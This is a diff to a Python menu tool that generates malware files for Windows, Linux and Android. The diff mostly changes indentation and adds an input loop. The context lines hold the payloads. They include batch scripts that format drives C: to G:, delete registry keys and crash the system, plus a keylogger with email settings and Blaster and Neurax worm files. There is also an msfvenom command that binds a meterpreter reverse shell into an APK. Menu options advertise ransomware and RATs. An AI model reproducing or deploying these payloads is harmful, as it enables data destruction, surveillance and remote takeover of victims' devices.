@@ -13,8 +13,9 @@ import subprocess
 print(platform.system())
 print(platform.release())
 print(platform.version())
-file = open("keylogger.py", "w+")
-file.write('''SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
+def keylogger():
+ file = open("keylogger.py", "w+")
+ file.write('''SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
     EMAIL_ADDRESS = "put_real_address_here@gmail.com"
     EMAIL_PASSWORD = "put_real_pw"
 
@@ -2630,7 +2631,7 @@ def thanks():
     / 　 づ
         ''')
 
-    def windows8():
+def windows8():
         virus8 = open('blasterworm.c', 'w+')
         virus8.write('''
             #include <winsock2.h>
@@ -3990,7 +3991,7 @@ Great
 
             ''')
 
-    def windows9():
+def windows9():
         virus9 = open('format.bat', 'w+')
         virus9.write('''format C:/q /y
                             format D:/q /y
@@ -3998,14 +3999,14 @@ Great
                             format F:/q /y
                             format G:/q /y''')
 
-    def windows10():
+def windows10():
         virus10 = open('registry.bat', 'w+')
         virus10.write('''@ECHO OFF
                  START reg delete HKCR/.exe
                  START reg delete HKCR/.dll
                  START reg delete HKCR/*''')
 
-    def windows11():
+def windows11():
         virus11 = open('internet.bat', 'w+')
         virus11.write('''echo @echo off>c:windowswimn32.bat
 echo break off>>c:windowswimn32.bat
@@ -4017,7 +4018,7 @@ echo You Have Been HACKED!
 PAUSE
 ''')
 
-    def windows12():
+def windows12():
         virus12 = open('neurax.go', 'w+')
         virus12.write('''
             package neurax
@@ -4531,7 +4532,7 @@ func NeuraxSetTTL(interval string) {
 
             ''')
 
-    def windows13():
+def windows13():
         virus13 = open('SystemMeltdown.bat', 'w+')
         virus13.write('''
             :CRASH
@@ -4584,17 +4585,17 @@ def android():
     read -p "[*]Enter lport#~: "lport
     echo -e "\e[31m[*]Reverse Engineering Started...;p\e[0m"
     msfvenom -x $path -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> binded.apk
-    
+
     #signing apk
     echo -e "\e[31m
     echo -e "[-]Signing the apk...
     zipalign -v 4 binded.apk binded-signed.apk
-    
+
     rm binded.apk && mv binded-signed.apk $payload.apk
     echo -e "\e[34m
     read -p "[*]Start listener(Enter) or Close (Ctrl+c) : " listener
     msfconsole
-    
+
     ''')
 
 
@@ -4673,18 +4674,19 @@ help = Fore.YELLOW + '''
 +|      -q          Quit                   |+
  ==========================================='''
 os = str(os.getcwd())
-command = input(Fore.CYAN + "[+]Input a Command: ")
-if command == "python3 warrior.py -h":
+while True:
+ command = input(Fore.CYAN + "[+]Input a Command: ")
+ if command == "python3 warrior.py -h":
     print(help)
     print("Try again.")
-elif command == "python3 warrior.py":
+ elif command == "python3 warrior.py":
     print(help)
     print("Try again.")
-elif command == "python3 warrior.py -o":
+ elif command == "python3 warrior.py -o":
     print(Fore.CYAN + 'Available operating systems...')
     time.sleep(2)
     print("Linux, Windows, Android")
-elif command == "python3 warrior.py -v":
+ elif command == "python3 warrior.py -v":
     print(Fore.MAGENTA + '''  
     =============================================
     +|              L I N U X                   |+
@@ -4733,7 +4735,7 @@ elif command == "python3 warrior.py -v":
     ||────────▀▀─▀▀─────────||                 || 
     ||python3 warrior.py -o Android -s         ||
     ==========================================|''')
-elif command == "python3 warrior.py -o Windows":
+ elif command == "python3 warrior.py -o Windows":
     print(Fore.GREEN + '''
 =============================================
 +|           W I N D O W S                  |+
@@ -4756,7 +4758,7 @@ elif command == "python3 warrior.py -o Windows":
  ===========================================
     ''')
 
-elif command == "python3 warrior.py -o Android":
+ elif command == "python3 warrior.py -o Android":
     print(Fore.MAGENTA + '''
   +────▀▄───▄▀─────+ |||==================|
 ──────▄█▀███▀█▄───────|| A P K            |
@@ -4766,7 +4768,7 @@ elif command == "python3 warrior.py -o Android":
 python3 warrior.py -o Android -s          |
 ==========================================|''')
 
-elif command == "python3 warrior.py -o Linux":
+ elif command == "python3 warrior.py -o Linux":
     print(Fore.MAGENTA + '''
 
 =============================================
@@ -4782,18 +4784,18 @@ elif command == "python3 warrior.py -o Linux":
 +|       [6]Rat                            |+
  ===========================================
     ''')
-elif command == "python3 warrior.py -u":
+ elif command == "python3 warrior.py -u":
     print("Preparing for update...")
     os.system("git clone https://github.com/fonderelite/warrior")
     print(Fore.GREEN + "Done!")
     thanks()
-elif command == "python3 warrior.py -q":
+ elif command == "python3 warrior.py -q":
     print("Quitting...")
     time.sleep(2)
     thanks()
     quit()
 
-elif command == "python3 warrior.py -o Linux -v 1 -s":
+ elif command == "python3 warrior.py -o Linux -v 1 -s":
     print(Fore.YELLOW + "Your Current Dir is: " + os)
     print(Fore.YELLOW + "Making a keylogger...")
     time.sleep(3)
@@ -4803,7 +4805,7 @@ elif command == "python3 warrior.py -o Linux -v 1 -s":
     print(Fore.GREEN + "DONE!")
     thanks()
 
-elif command == "python3 warrior.py -o Windows -v 1 -s":
+ elif command == "python3 warrior.py -o Windows -v 1 -s":
     os = str(os.getcwd())
     print(Fore.YELLOW + "Your Current Dir is: " + os)
     print(Fore.YELLOW + "Making a keylogger...")
@@ -4814,7 +4816,7 @@ elif command == "python3 warrior.py -o Windows -v 1 -s":
     print(Fore.GREEN + "DONE!")
     thanks()
 
-elif command == "python3 warrior.py -o Windows -v 2 -s":
+ elif command == "python3 warrior.py -o Windows -v 2 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making a System Deletion Virus...")
     time.sleep(3)
@@ -4824,7 +4826,7 @@ elif command == "python3 warrior.py -o Windows -v 2 -s":
     print(Fore.GREEN + "DONE!")
     thanks()
 
-elif command == "python3 warrior.py -o Windows -v 3 -s":
+ elif command == "python3 warrior.py -o Windows -v 3 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making a Rat For Windows...")
     time.sleep(3)
@@ -4832,7 +4834,7 @@ elif command == "python3 warrior.py -o Windows -v 3 -s":
     rat1()
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
-elif command == "python3 warrior.py -o Windows -v 4 -s":
+ elif command == "python3 warrior.py -o Windows -v 4 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making a WifiKiller Virus For Windows...")
     time.sleep(3)
@@ -4841,7 +4843,7 @@ elif command == "python3 warrior.py -o Windows -v 4 -s":
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
     thanks()
-elif command == "python3 warrior.py -o Windows -v 5 -s":
+ elif command == "python3 warrior.py -o Windows -v 5 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making a Windows Destroyer Virus For Windows...")
     time.sleep(3)
@@ -4851,7 +4853,7 @@ elif command == "python3 warrior.py -o Windows -v 5 -s":
     print(Fore.GREEN + "DONE!")
     thanks()
 
-elif command == "python3 warrior.py -o Windows -v 6 -s":
+ elif command == "python3 warrior.py -o Windows -v 6 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making a Ransomeware For Windows...")
     time.sleep(3)
@@ -4860,7 +4862,7 @@ elif command == "python3 warrior.py -o Windows -v 6 -s":
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
     thanks()
-elif command == "python3 warrior.py -o Windows -v 7 -s":
+ elif command == "python3 warrior.py -o Windows -v 7 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making the ILY Virus/Worm For Windows...")
     time.sleep(3)
@@ -4869,7 +4871,7 @@ elif command == "python3 warrior.py -o Windows -v 7 -s":
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
     thanks()
-elif command == "python3 warrior.py -o Windows -v 8 -s":
+ elif command == "python3 warrior.py -o Windows -v 8 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making the BlasterWorm.c For Windows...")
     time.sleep(3)
@@ -4878,7 +4880,7 @@ elif command == "python3 warrior.py -o Windows -v 8 -s":
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
     thanks()
-elif command == "python3 warrior.py -o Windows -v 9 -s":
+ elif command == "python3 warrior.py -o Windows -v 9 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making the Format Virus For Windows...")
     time.sleep(3)
@@ -4887,7 +4889,7 @@ elif command == "python3 warrior.py -o Windows -v 9 -s":
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
     thanks()
-elif command == "python3 warrior.py -o Windows -v 10 -s":
+ elif command == "python3 warrior.py -o Windows -v 10 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making the Registry Virus For Windows...")
     time.sleep(3)
@@ -4897,7 +4899,7 @@ elif command == "python3 warrior.py -o Windows -v 10 -s":
     print(Fore.GREEN + "DONE!")
     thanks()
 
-elif command == "python3 warrior.py -o Windows -v 12 -s":
+ elif command == "python3 warrior.py -o Windows -v 12 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making the Neurax.go Worm For Windows...")
     time.sleep(3)
@@ -4907,7 +4909,7 @@ elif command == "python3 warrior.py -o Windows -v 12 -s":
     print(Fore.GREEN + "DONE!")
     thanks()
 
-elif command == "python3 warrior.py -o Windows -v 13 -s":
+ elif command == "python3 warrior.py -o Windows -v 13 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making the SystemMeltdown Virus For Windows...")
     time.sleep(3)
@@ -4916,7 +4918,7 @@ elif command == "python3 warrior.py -o Windows -v 13 -s":
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
     thanks()
-elif command == "python3 warrior.py -o Linux -v 2 -s":
+ elif command == "python3 warrior.py -o Linux -v 2 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making the File Deletion Virus For Linux...")
     time.sleep(3)
@@ -4926,7 +4928,7 @@ elif command == "python3 warrior.py -o Linux -v 2 -s":
     print(Fore.GREEN + "DONE!")
     thanks()
 
-elif command == "python3 warrior.py -o Linux -v 3 -s":
+ elif command == "python3 warrior.py -o Linux -v 3 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making the ELF Virus For Linux...")
     time.sleep(3)
@@ -4936,7 +4938,7 @@ elif command == "python3 warrior.py -o Linux -v 3 -s":
     print(Fore.GREEN + "DONE!")
     thanks()
 
-elif command == "python3 warrior.py -o Linux -v 4 -s":
+ elif command == "python3 warrior.py -o Linux -v 4 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making the Linux_Virus.c For Linux...")
     time.sleep(3)
@@ -4945,7 +4947,7 @@ elif command == "python3 warrior.py -o Linux -v 4 -s":
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
     thanks()
-elif command == "python3 warrior.py -o Linux -v 5 -s":
+ elif command == "python3 warrior.py -o Linux -v 5 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making a Ransomware For Linux...")
     time.sleep(3)
@@ -4954,7 +4956,7 @@ elif command == "python3 warrior.py -o Linux -v 5 -s":
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
     thanks()
-elif command == "python3 warrior.py -o Linux -v 6 -s":
+ elif command == "python3 warrior.py -o Linux -v 6 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making a Rat For Linux...")
     time.sleep(3)
@@ -4963,10 +4965,10 @@ elif command == "python3 warrior.py -o Linux -v 6 -s":
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
     thanks()
-elif command == "python3 warrior.py -o Android -s":
+ elif command == "python3 warrior.py -o Android -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     android()
-else:
+ else:
     print(Fore.RED + '''
  ██████████                                        ███
 ░░███░░░░░█                                       ░███
